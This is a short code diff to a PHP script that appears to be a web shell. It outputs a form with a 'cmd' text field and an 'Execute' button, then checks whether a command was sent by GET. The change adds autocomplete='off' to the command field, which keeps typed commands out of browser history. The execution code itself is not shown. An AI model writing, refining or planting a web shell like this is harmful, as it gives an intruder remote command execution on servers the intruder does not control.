@@ -46,7 +46,7 @@ foreach ($dirs as $key => $value) {
 }
 
 echo "\n<br><form action='".$_SERVER['PHP_SELF']."' method='GET'>";
-echo "<input type='text' name='cmd' autofocus>\n<input type='submit' value='Execute'>\n";
+echo "<input type='text' name='cmd' autocomplete='off' autofocus>\n<input type='submit' value='Execute'>\n";
 echo "</form>";
 
 if (isset($_GET['cmd'])) {
